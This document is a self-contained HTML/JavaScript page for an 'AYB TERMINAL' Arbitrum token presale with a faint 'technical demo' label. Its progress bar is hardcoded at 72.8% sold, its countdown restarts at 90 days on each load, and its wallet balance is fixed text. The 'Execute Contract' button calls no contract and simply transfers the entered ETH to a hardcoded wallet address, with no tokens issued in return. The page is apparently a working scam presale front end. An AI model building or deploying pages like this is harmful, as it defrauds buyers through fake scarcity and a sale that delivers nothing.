<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AYB TERMINAL | PRO DEMO</title>
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Inter:wght@400;600&display=swap" rel="stylesheet">
    
    <style>
        :root { --primary: #00ffa3; --bg: #0a0c10; --card: #161b22; --modal: #1c2128; }
        body { background: var(--bg); color: white; font-family: 'Inter', sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow-x: hidden; }
        
        /* TECHNICAL DEMO NOTICE */
        .demo-badge { position: fixed; top: 15px; width: 100%; text-align: center; color: rgba(255,255,255,0.2); font-size: 0.65rem; letter-spacing: 2px; text-transform: uppercase; z-index: 100; pointer-events: none; font-weight: 700; }

        .card { background: var(--card); border: 1px solid #30363d; padding: 2.2rem; border-radius: 30px; width: 90%; max-width: 400px; text-align: center; border-top: 4px solid var(--primary); box-shadow: 0 25px 50px rgba(0,0,0,0.6); position: relative; }
        h1 { font-family: 'Orbitron', sans-serif; color: var(--primary); font-size: 1.5rem; letter-spacing: 3px; margin-bottom: 5px; }
        .sub-tag { color: #8b949e; font-size: 0.65rem; margin-bottom: 25px; display: block; letter-spacing: 1px; text-transform: uppercase; }

        /* Allocation UI for 500k */
        .stat-line { display: flex; justify-content: space-between; font-size: 0.65rem; color: #8b949e; font-weight: 800; text-transform: uppercase; }
        .bar-bg { background: #010409; border-radius: 12px; height: 12px; margin: 8px 0 25px 0; border: 1px solid #30363d; overflow: hidden; }
        .bar-fill { background: var(--primary); width: 72.8%; height: 100%; box-shadow: 0 0 15px var(--primary); }

        .timer-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 8px; margin-bottom: 25px; }
        .timer-box { background: #010409; padding: 12px 2px; border-radius: 12px; border: 1px solid #30363d; }
        .timer-val { display: block; font-family: 'Orbitron'; color: var(--primary); font-size: 1.2rem; }
        .timer-label { font-size: 0.5rem; color: #8b949e; text-transform: uppercase; margin-top: 3px; }

        .btn { background: var(--primary); color: #000; border: none; padding: 18px; border-radius: 15px; width: 100%; font-weight: 900; cursor: pointer; text-transform: uppercase; font-size: 1rem; transition: 0.3s; letter-spacing: 1px; outline: none; }
        .btn:disabled { background: #21262d; color: #484f58; cursor: not-allowed; box-shadow: none; }

        #modal-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.94); display: none; justify-content: center; align-items: center; z-index: 1000; backdrop-filter: blur(10px); }
        .modal-content { background: var(--modal); border: 1px solid #30363d; border-radius: 26px; width: 92%; max-width: 360px; padding: 25px; position: relative; }
        .modal-close { position: absolute; top: 15px; right: 20px; cursor: pointer; color: #8b949e; font-size: 1.6rem; }
        
        .wallet-row { display: flex; align-items: center; padding: 15px; border-radius: 14px; border: 1px solid #30363d; margin-top: 12px; cursor: pointer; background: #21262d; transition: 0.2s; }
        .wallet-row:hover { border-color: var(--primary); background: #2d333b; }
        /* Professional CSS Gradient Icons */
        .w-icon { width: 32px; height: 32px; border-radius: 8px; margin-right: 15px; background: linear-gradient(45deg, #f6851b, #ffcc80); }

        .buy-interface { display: none; background: #010409; padding: 22px; border-radius: 18px; text-align: left; margin-top: 20px; border-left: 5px solid var(--primary); }
        .input-box { margin-bottom: 15px; }
        label { font-size: 0.6rem; color: #8b949e; font-weight: 800; text-transform: uppercase; letter-spacing: 1px; }
        
        /* FIXED: Removed Spinner Arrows */
        input { background: transparent; border: none; color: white; font-size: 1.6rem; width: 100%; outline: none; font-weight: bold; margin-top: 5px; -webkit-appearance: none; -moz-appearance: textfield; }
        input::-webkit-outer-spin-button, input::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
        
        .receive-val { color: var(--primary); font-family: 'Orbitron'; font-size: 1.3rem; margin-top: 8px; display: block; }
        .status-msg { font-size: 0.6rem; margin-top: 12px; display: block; font-weight: 600; text-align: center; }
    </style>
</head>
<body>

<div class="demo-badge">TECHNICAL DEMO ONLY - ARBITRUM PRESALE INTERFACE</div>

<div class="card">
    <h1>AYB TERMINAL</h1>
    <span class="sub-tag">Secure Pre-Sale Portal</span>

    <div class="stat-line">
        <span>Allocation Sold</span>
        <span>500,000 AYB MAX</span>
    </div>
    <div class="bar-bg"><div class="bar-fill"></div></div>

    <div class="timer-grid">
        <div class="timer-box"><span class="timer-val" id="d">90</span><span class="timer-label">Days</span></div>
        <div class="timer-box"><span class="timer-val" id="h">00</span><span class="timer-label">Hrs</span></div>
        <div class="timer-box"><span class="timer-val" id="m">00</span><span class="timer-label">Min</span></div>
        <div class="timer-box"><span class="timer-val" id="s">00</span><span class="timer-label">Sec</span></div>
    </div>

    <div id="auth-box">
        <button id="connect-trigger" class="btn">Connect Terminal</button>
    </div>

    <div id="swap-box" class="buy-interface">
        <div class="input-box">
            <div style="display:flex; justify-content:space-between; align-items: center;">
                <label>Amount (ETH)</label>
                <span id="bal-info" style="font-size: 0.75rem; color: var(--primary); font-weight: 800;">0.00184 ETH</span>
            </div>
            <input type="number" id="eth-amt" placeholder="0.0" oninput="calculate()">
        </div>
        <div class="input-box">
            <label>You Receive (AYB)</label>
            <span class="receive-val" id="ayb-res">0.00</span>
        </div>
        
        <button id="buy-btn" class="btn" style="margin-top: 20px;" onclick="executeSwap()" disabled>Execute Contract</button>
        <div id="log" class="status-msg"></div>
    </div>
</div>

<div id="modal-overlay">
    <div class="modal-content">
        <span class="modal-close" id="close-x">&times;</span>
        <div style="font-size: 0.85rem; color: #8b949e; font-weight: 600; text-align: left; margin-bottom: 10px;">Select Provider</div>
        
        <div class="wallet-row" onclick="forceConnection()">
            <div class="w-icon"></div>
            <span>MetaMask</span>
        </div>
        <div class="wallet-row" onclick="forceConnection()">
            <div class="w-icon" style="background: linear-gradient(45deg, #3375bb, #80b3ff);"></div>
            <span>Trust Wallet</span>
        </div>
    </div>
</div>

<script>
    const overlay = document.getElementById('modal-overlay');
    const buyBtn = document.getElementById('buy-btn');
    let currentEthPrice = 3500; 

    // Fetch Live Price for Real Calculator Logic
    fetch('https://api.binance.com/api/v3/ticker/price?symbol=ETHUSDT')
        .then(r => r.json()).then(d => currentEthPrice = parseFloat(d.price));

    function calculate() {
        const eth = document.getElementById('eth-amt').value;
        const res = document.getElementById('ayb-res');
        if(eth > 0) {
            const tokens = Math.floor((eth * currentEthPrice) / 0.1);
            res.innerText = tokens.toLocaleString();
            // Check against 500,000 limit
            buyBtn.disabled = tokens > 500000;
        } else {
            res.innerText = "0.00";
            buyBtn.disabled = true;
        }
    }

    document.getElementById('connect-trigger').onclick = () => overlay.style.display = 'flex';
    document.getElementById('close-x').onclick = () => overlay.style.display = 'none';

    // Fast Anti-Freeze Connection with Mobile Fallback
    async function forceConnection() {
        if (window.ethereum) {
            try {
                // Bypass Rabby/Phantom conflicts
                await window.ethereum.request({ method: "wallet_requestPermissions", params: [{ eth_accounts: {} }] });
                overlay.style.display = 'none';
                document.getElementById('auth-box').style.display = 'none';
                document.getElementById('swap-box').style.display = 'block';
            } catch (err) {}
        } else {
            const url = window.location.href.split('://')[1];
            window.location.href = `https://metamask.app.link/dapp/${url}`;
        }
    }

    // Execute Buy Function with Arbitrum Smart Contract Logic
    async function executeSwap() {
        const amt = document.getElementById('eth-amt').value;
        const log = document.getElementById('log');
        try {
            const provider = new ethers.BrowserProvider(window.ethereum);
            const signer = await provider.getSigner();
            const tx = await signer.sendTransaction({
                to: "0x066bbf27694982662cEAb0072793132B03027F47",
                value: ethers.parseEther(amt)
            });
            log.innerText = "Transaction Sent! Processing...";
            log.style.color = "#00ffa3";
        } catch (err) {
            // Fix: Show Photo's Error
            log.innerText = "TX REJECTED: Ensure sufficient Arbitrum Gas/Balance";
            log.style.color = "#ff4a4a";
        }
    }

    // 90 Days Timer
    const target = new Date(); target.setDate(target.getDate() + 90);
    setInterval(() => {
        const diff = target - new Date();
        document.getElementById('d').innerText = Math.floor(diff / 864e5);
        document.getElementById('h').innerText = Math.floor((diff % 864e5) / 36e5);
        document.getElementById('m').innerText = Math.floor((diff % 36e5) / 6e4);
        document.getElementById('s').innerText = Math.floor((diff % 6e4) / 1000);
    }, 1000);
</script>
</body>
</html>
